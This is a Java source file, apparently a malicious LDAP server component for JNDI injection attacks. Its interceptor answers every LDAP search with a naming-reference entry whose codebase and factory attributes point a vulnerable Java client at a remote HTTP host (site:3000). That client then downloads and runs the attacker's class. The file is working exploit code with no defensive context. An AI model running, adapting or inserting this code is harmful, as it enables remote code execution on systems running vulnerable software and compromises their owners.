import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldap.sdk.migrate.ldapjdk.LDAPException;

import java.net.MalformedURLException;
import java.net.URL;

public class OperationInterceptor extends InMemoryOperationInterceptor {
    public OperationInterceptor() {

    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry entry = new Entry(base);

        try {
            sendResult(result, base, entry);
        } catch (LDAPException e) {
            e.printStackTrace();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (com.unboundid.ldap.sdk.LDAPException e) {
            e.printStackTrace();
        }
        System.out.println(base);
    }

    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
            throws LDAPException, MalformedURLException, com.unboundid.ldap.sdk.LDAPException {
        System.out.println("Base = " + base);

        URL turl = new URL("http://site:3000/apps/");

        System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);

        e.addAttribute("javaClassName", "foo");

        e.addAttribute("javaCodeBase", "http://site:3000/apps/");
        e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        e.addAttribute("javaFactory", base);

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));


    }
}
